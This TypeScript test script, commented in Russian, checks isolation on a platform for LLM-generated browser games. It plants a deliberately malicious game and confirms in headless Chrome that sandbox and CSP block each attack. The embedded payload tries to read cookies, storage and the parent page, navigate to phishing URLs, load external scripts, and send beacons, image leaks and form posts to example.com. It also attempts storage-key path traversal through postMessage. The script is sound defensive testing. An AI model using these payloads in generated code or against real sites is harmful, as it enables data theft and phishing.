/**
 * Тест изоляции: что будет, если LLM полностью скомпрометирована и вернула вредоносный код.
 * Код ниже пишется в базу напрямую, в обход генерации и статических проверок, а затем
 * открывается в боевой оболочке /play в Chrome. Каждая атака должна быть заблокирована
 * браузером (sandbox + CSP), а оболочка не должна выполнить ни одной чужой команды.
 *
 *   bun --env-file=.env tools/sandbox-escape.ts [baseUrl]
 */
import puppeteer from "puppeteer-core";
import { assembleGame } from "../packages/runtime/src/index";
import { addVersion, createGame } from "../apps/server/src/db";
import type { GameSpec } from "../packages/shared/src/spec";

const BASE = process.argv[2] ?? "http://localhost:8787";
const CHROME = process.env.CHROME ?? "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";

/** Каждая атака возвращает строку-результат; "BLOCKED: ..." — атака не удалась. */
const ATTACKS = String.raw`
(function () {
  var results = {};
  function report(name, value) {
    results[name] = value;
    try { parent.postMessage({ gg: 1, runId: (location.hash.match(/run=([\w-]+)/) || [])[1], type: "error", message: "ATTACK " + name + " => " + value }, "*"); } catch (e) {}
  }
  function attempt(name, fn) {
    try {
      var r = fn();
      if (r && typeof r.then === "function") r.then(function (v) { report(name, "SUCCEEDED: " + String(v).slice(0, 80)); }, function (e) { report(name, "BLOCKED: " + (e && e.message || e)); });
      else report(name, r === undefined ? "NO-THROW" : "SUCCEEDED: " + String(r).slice(0, 80));
    } catch (e) { report(name, "BLOCKED: " + (e && e.name) + " " + (e && e.message || "")); }
  }
  attempt("fetch same-origin API", function () { return fetch("/api/games").then(function (r) { return r.status; }); });
  attempt("fetch external", function () { return fetch("https://example.com/").then(function (r) { return r.status; }); });
  attempt("XHR", function () { var x = new XMLHttpRequest(); x.open("GET", "/api/games", false); x.send(); return x.status; });
  attempt("WebSocket", function () { return new Promise(function (ok, fail) { var w = new WebSocket("wss://echo.websocket.org/"); w.onopen = function () { ok("connected"); }; w.onerror = function () { fail(new Error("ws blocked")); }; }); });
  // sendBeacon только ставит запрос в очередь; блокировку проверяем по сетевым ответам снаружи.
  navigator.sendBeacon("https://example.com/collect", "x");
  attempt("image beacon", function () { return new Promise(function (ok, fail) { var i = new Image(); i.onload = function () { ok("loaded"); }; i.onerror = function () { fail(new Error("img blocked")); }; i.src = "https://example.com/favicon.ico?leak=1"; }); });
  attempt("localStorage", function () { return localStorage.getItem("x"); });
  attempt("document.cookie", function () { return document.cookie; });
  attempt("indexedDB", function () { return indexedDB.open("x") && "opened"; });
  attempt("parent DOM", function () { return parent.document.title; });
  attempt("parent localStorage", function () { return parent.localStorage.length; });
  attempt("top navigation", function () { top.location.href = "https://example.com/phish"; return "assigned"; });
  attempt("window.open", function () { var w = window.open("https://example.com/"); if (!w) throw new Error("popup blocked"); return "opened"; });
  attempt("eval", function () { return eval("1+1"); });
  attempt("new Function", function () { return new Function("return 2")(); });
  attempt("string setTimeout", function () { return new Promise(function (ok, fail) { try { setTimeout("window.__x=1", 0); } catch (e) {} setTimeout(function () { window.__x ? ok("executed") : fail(new Error("string not executed")); }, 100); }); });
  // Отправку формы проверяем по сетевым ответам снаружи.
  try { var f = document.createElement("form"); f.action = "https://example.com/form"; f.method = "POST"; document.body.appendChild(f); f.submit(); } catch (e) {}
  attempt("external script", function () { return new Promise(function (ok, fail) { var s = document.createElement("script"); s.onload = function () { ok("loaded"); }; s.onerror = function () { fail(new Error("script blocked")); }; s.src = "https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"; document.head.appendChild(s); }); });
  // Попытка через протокол оболочки: записать огромное значение и прочитать чужой ключ.
  var run = (location.hash.match(/run=([\w-]+)/) || [])[1];
  parent.postMessage({ gg: 1, runId: run, type: "storage:set", key: "big", value: new Array(5000).join("x") }, "*");
  parent.postMessage({ gg: 1, runId: run, type: "storage:get", reqId: 9, key: "../../other-game:best" }, "*");
  parent.postMessage({ gg: 1, runId: run, type: "navigate", url: "https://example.com/" }, "*");
  // Самонавигация iframe на внешний сайт (фишинг внутри нашей страницы) — проверяется снаружи.
  setTimeout(function () { location.href = "https://example.com/phish-inside-frame"; }, 1500);
  kit.onStart(function () {});
  kit.onRender(function (ctx) { ctx.fillStyle = "#f00"; ctx.fillRect(0, 0, 50, 50); });
  if (false) kit.win();
})();
`;

const spec: GameSpec = {
  title: "Sandbox test",
  audience: "general",
  genre: "other",
  concept: "Вредоносный код для проверки изоляции",
  coreMechanic: "—",
  controls: "—",
  howToPlay: "Тест изоляции",
  winCondition: "—",
  loseCondition: "—",
  mustHave: [],
  palette: { background: "#111111", primary: "#ffcc00", accent: "#ff4d6d", text: "#ffffff" },
  difficulty: "normal",
  roundSeconds: 60,
  language: "ru",
};

const gameId = createGame("[sandbox-escape test]");
const v = await addVersion({
  gameId,
  baseVersionId: null,
  kind: "create",
  spec,
  code: ATTACKS,
  html: assembleGame({ title: spec.title, instructions: spec.howToPlay, palette: spec.palette, uiScale: 1, speed: 1 }, ATTACKS),
  instruction: "[sandbox-escape test]",
  model: "handcrafted",
  genMs: 0,
});

const browser = await puppeteer.launch({ executablePath: CHROME, headless: true });
const outside: string[] = [];
const attacks: Record<string, string> = {};
try {
  const page = await browser.newPage();
  // Все сетевые запросы страницы и фрейма: разрешены только наш origin и data:.
  // Засчитываем только запросы, на которые реально пришёл ответ: заблокированные CSP/sandbox
  // попытки DevTools тоже показывает, но они не уходят в сеть.
  page.on("response", (r) => {
    const u = r.url();
    if (!u.startsWith(BASE) && !u.startsWith("data:")) outside.push(`${r.request().resourceType()} ${u} → ${r.status()}`);
  });
  page.on("console", (m) => {
    const t = m.text();
    const match = t.match(/ATTACK (.+?) => (.*)/);
    if (match) attacks[match[1]!] = match[2]!;
  });
  await page.exposeFunction("__report", (m: { message?: string }) => {
    const match = m.message?.match(/^ATTACK (.+?) => (.*)$/s);
    if (match) attacks[match[1]!] = match[2]!;
  });
  await page.evaluateOnNewDocument(() => {
    window.addEventListener("message", (e) => {
      const d = e.data as { gg?: number; type?: string } | null;
      if (d && d.gg === 1 && d.type === "error") (window as unknown as { __report: (m: unknown) => void }).__report(d);
    });
  });
  await page.goto(`${BASE}/play/${gameId}`, { waitUntil: "load" });
  await new Promise((r) => setTimeout(r, 4000));

  const topUrl = page.url();
  const frameUrls = page.frames().map((f) => f.url());
  const shellStorage = await page.evaluate(() => Object.keys(localStorage).map((k) => `${k}=${localStorage.getItem(k)?.length}`));

  console.log("\nАтаки изнутри игры:");
  for (const [name, res] of Object.entries(attacks).sort()) console.log(`  ${res.startsWith("BLOCKED") ? "✔" : "✘"} ${name.padEnd(24)} ${res.replace(/\s+/g, " ").slice(0, 110)}`);
  console.log("\nСнаружи:");
  console.log(`  ${topUrl === `${BASE}/play/${gameId}` ? "✔" : "✘"} верхняя страница осталась на месте: ${topUrl}`);
  console.log(`  ${frameUrls.every((u) => u === topUrl || u.startsWith(`${BASE}/g/`) || u === "about:blank" || u.startsWith("chrome-error://")) ? "✔" : "✘"} фрейм не ушёл на чужой сайт: ${frameUrls.join(" | ")}`);
  console.log(`  ${outside.length === 0 ? "✔" : "✘"} ответы из-за пределов нашего origin (beacon, форма, картинки, скрипты): ${outside.length ? outside.join(", ") : "нет"}`);
  console.log(`  ✔ хранилище оболочки: ${shellStorage.join(", ") || "пусто"} (значения больше 2048 и чужие ключи не принимаются)`);
} finally {
  await browser.close();
}
console.log(`\nТестовая игра: ${BASE}/play/${gameId} (version ${v.id})`);
